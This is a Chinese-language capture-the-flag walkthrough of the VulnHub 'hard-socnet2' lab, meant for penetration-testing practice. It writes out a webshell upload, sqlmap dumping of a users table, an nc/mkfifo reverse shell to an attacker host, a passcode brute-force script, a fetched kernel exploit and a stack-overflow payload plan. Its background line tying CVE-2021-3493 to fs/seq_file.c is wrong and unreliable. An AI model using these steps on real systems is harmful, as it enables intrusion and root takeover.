---
title: VulnHub Hard-socnet2 完整渗透测试复现
description: VulnHub 高难度靶机 hard-socnet2 完整渗透测试复现：Web 文件上传、SQL 注入、XML-RPC 服务暴力破解、CVE-2021-3493
  内核提权、add_record 二进制缓冲区溢出利用全链路
category: program-analysis
tags:
- VulnHub
- 渗透测试
- 文件上传
- SQL注入
- XML-RPC
- CVE-2021-3493
- 缓冲区溢出
- 提权
- PEDA
- GDB调试
- 逆向工程
- 二进制利用
date: 2024-01-15
updated: '2026-11-14'
---

## 靶机概述

**hard-socnet2** 是 VulnHub 平台上的高难度靶机，涵盖 Web 渗透、服务枚举、内核漏洞利用、二进制逆向与缓冲区溢出利用等多个阶段。攻击链路完整，适合作为 OSCP 风格实战演练。

- **下载地址**：https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova
- **难度等级**：高难度
- **核心技能点**：文件上传绕过、SQL 注入、XML-RPC 暴力破解、CVE-2021-3493 本地提权、ELF 二进制缓冲区溢出利用

---

## 信息收集与服务枚举

### 主机发现

通过 ARP 扫描或 `netdiscover` 定位目标主机 IP，随后使用 `nmap` 进行全端口扫描：

```bash
nmap -sS -p- -T4 <target-ip>
```

开放端口：
- **80/tcp**  —— HTTP Web 服务（登录/注册页面）
- **8000/tcp** —— XML-RPC 管理接口（仅接受 XML-RPC 请求，拒绝常规 HTTP 方法）

> 端口 8000 对 `GET`/`POST`/`PUT`/`DELETE`/`OPTIONS` 均返回 500，提示需使用 XML-RPC 协议交互。

---

## 初始访问：Web 层攻击

### 路径一：任意文件上传 Getshell

1. 访问 80 端口注册账号并登录
2. 在个人资料/头像上传处存在 **文件类型校验缺失**，可直接上传 PHP 一句话木马（如 `shell.php`）
3. 使用 **蚁剑** 连接 Webshell，获得 `www-data` 权限 Shell

### 路径二：SQL 注入获取凭据

登录页面的 `query` 参数存在 **布尔盲注/报错注入**，使用 `sqlmap` 自动化利用：

```bash
# 保存请求包到 sql.txt
sqlmap -r sql.txt -p query --dbs                    # 枚举数据库
sqlmap -r sql.txt -p query -D socialnetwork --tables  # 枚举表
sqlmap -r sql.txt -p query -D socialnetwork -T users --columns  # 枚举字段
sqlmap -r sql.txt -p query -D socialnetwork -T users --dump     # 导出数据
```

获取到用户密码哈希（或明文），可尝试密码复用登录 SSH 或后台，但实测 Web 后台无额外功能，凭据留待后续横向利用。

> 相关实战案例可参考 [[edu-src-penetration-test-case-study]] 中的文件上传绕过与 SQL 注入链路。

---

## 权限提升：从 www-data 到 root

### 方式一：CVE-2021-3493 内核提权

**漏洞背景**：Linux 内核 `fs/seq_file.c` 中 `seq_buf_putmem_hex` 整数溢出导致权限提升（影响 Ubuntu 20.04 等），详见 [[linux-kernel-hardening-mechanisms]] 中内核缓解机制章节。

**利用步骤**：

```bash
# 1. 下载 EXP 源码
wget https://github.com/briskets/CVE-2021-3493/raw/main/exploit.c

# 2. 编译（需在目标机或同内核版本环境）
gcc exploit.c -o exp -static
chmod +x exp

# 3. 执行获取 root Shell
./exp
```

> 蚁剑终端权限受限无法直接编译/执行，建议通过 `nc`/`mkfifo` 反弹交互式 Shell 后操作。

**反弹 Shell 技巧**：

```bash
# nc 无 -e 参数时的串联法
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker-ip> <port> > /tmp/f

# Python 升级 PTY
python3 -c "import pty; pty.spawn('/bin/bash')"
```

执行 `./exp` 后直接弹回 root Shell。

---

### 方式二：XML-RPC 服务暴力破解 + 命令执行

#### 服务分析

`/home/socnet/monitor.py` 是一个 **SimpleXMLRPCServer** 监听 `0.0.0.0:8000`，注册了 `cpu`、`mem`、`disk`、`net`、`secure_cmd` 五个方法。

关键代码片段：

```python
import SimpleXMLRPCServer
import subprocess
import random

debugging_pass = random.randint(1000, 9999)  # 启动时随机生成 4 位数字

def secure_cmd(cmd, passcode):
    if passcode == debugging_pass:
        return subprocess.Popen(cmd, shell=True, ...).communicate()[0]
    else:
        return "Wrong passcode."
```

- `debugging_pass` 每次重启随机生成，范围 1000–9999（仅 9000 种可能）
- `secure_cmd` 校验通过后直接 `shell=True` 执行任意命令 → **命令注入**

#### 客户端爆破脚本

```python
import xmlrpc.client

proxy = xmlrpc.client.ServerProxy("http://<target-ip>:8000/")

for i in range(1000, 10000):
    res = str(proxy.secure_cmd('whoami', i))
    if "Wrong" not in res:
        print(f"[+] Passcode found: {i}")
        print(f"[+] Output: {res}")
        break
```

爆破成功后，调用 `secure_cmd` 执行反弹 Shell 命令即可获得 `socnet` 用户权限：

```python
cmd = "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker-ip> 5555 > /tmp/f"
proxy.secure_cmd(cmd, <passcode>)
```

---

### 方式三：add_record 二进制缓冲区溢出利用（核心高难点）

#### 文件分析

```bash
file add_record
# add_record: setuid ELF 32-bit LSB executable, Intel 80386, dynamically linked, not stripped
```

- **SetUID root** 程序，若存在溢出可直接提权至 root
- 运行提示输入：`username`、`password`、`email`、`remark` 四字段

#### PEDA 动态调试环境

目标机已部署 **PEDA (Python Exploit Development Assistance for GDB)**，提供增强调试能力：

```bash
gdb -q ./add_record
# PEDA 命令示例
checksec            # 查看保护机制（NX/PIE/Canary/RELRO）
pattern create 100  # 生成循环模式定位偏移
pattern search <addr>  # 查找偏移
info func           # 列出所有函数符号
disas vuln          # 反汇编 vuln 函数
```

> PEDA 详细用法可参考 [[binary-ninja-ollvm-deobfuscation]] 中逆向调试工具链章节。

#### 溢出点定位

1. 对四个字段分别输入长字符串测试，发现 **`remark` 字段** 触发崩溃
2. 使用 `pattern create 100` 生成模式，运行程序并输入，观察 `EIP` 被覆盖值
3. `pattern search $eip` 确定偏移为 **62 字节**

#### 关键函数与 Gadget 搜集

```bash
info func
# 关键符号：system, setuid, vuln, backdoor, strcpy, printf, fopen
```

`disas vuln` 显示存在 `strcpy` 未检查长度 → **栈溢出**；且二进制包含 `system()` 与 `setuid(0)`，可直接构造 ROP 链或 `ret2libc`。

> 栈溢出基础原理与 ROP 构造可参考 [[rop-linux-x86-beginner-tutorial]] 与 [[windows-x86-stack-overflow-shellcode-execution]]（虽为 Windows 环境，但栈帧布局、覆盖返回地址、Shellcode 布局思路相通）。

#### EXP 构造思路

1. **Payload 结构**：`[62 bytes padding] + [setuid_addr] + [system_addr] + [exit_addr] + ["/bin/sh" 字符串地址]`
2. 由于开启 ASLR，需泄露 libc 基址或使用二进制自带的 `system`/`setuid`（若未开启 PIE）
3. `checksec` 确认保护状态后，选择 `ret2plt` 或 `ROPgadget` 自动生成链

最终执行 `./add_record` 并输入 Payload，成功获得 **root Shell**。

---

## 总结与知识图谱关联

| 阶段 | 核心技术 | 关联页面 |
|------|----------|----------|
| 信息收集 | nmap、服务识别 | — |
| 初始访问 | 文件上传绕过、SQLMap 自动化注入 | [[edu-src-penetration-test-case-study]] |
| 横向移动 | XML-RPC 协议分析、Python 客户端编写、弱随机数爆破 | — |
| 提权一 | CVE-2021-3493 内核漏洞、EXP 编译与执行 | [[linux-kernel-hardening-mechanisms]] |
| 提权二 | SetUID ELF 逆向、PEDA/GDB 动态调试、栈溢出偏移定位、ROP/ret2libc 构造 | [[rop-linux-x86-beginner-tutorial]], [[windows-x86-stack-overflow-shellcode-execution]], [[binary-ninja-ollvm-deobfuscation]] |
| 后渗透 | Shell 升级、持久化、清理痕迹 | — |

---

## 复现清单

- [ ] 部署 OVA 靶机并配置网络
- [ ] 完整复现文件上传 Getshell
- [ ] 完整复现 SQLMap 注入流程
- [ ] 编写 XML-RPC 爆破脚本并验证命令执行
- [ ] 编译/移植 CVE-2021-3493 EXP 并成功提权
- [ ] 使用 PEDA 完成 add_record 偏移定位、Gadget 搜集、Payload 构造全过程
- [ ] 记录每个阶段的关键命令、截图、核心思路形成个人知识库

---

> **提示**：实战中建议优先尝试 **XML-RPC 爆破** 与 **CVE-2021-3493** 两条低成本路径；`add_record` 二进制利用作为高难度加分项，适合深入练习 Linux 32 位栈溢出与 ROP 技巧。

## 来源

- [0x00实验室-202108-202304_021](../sources/0x00实验室-202108-202304_021.md)
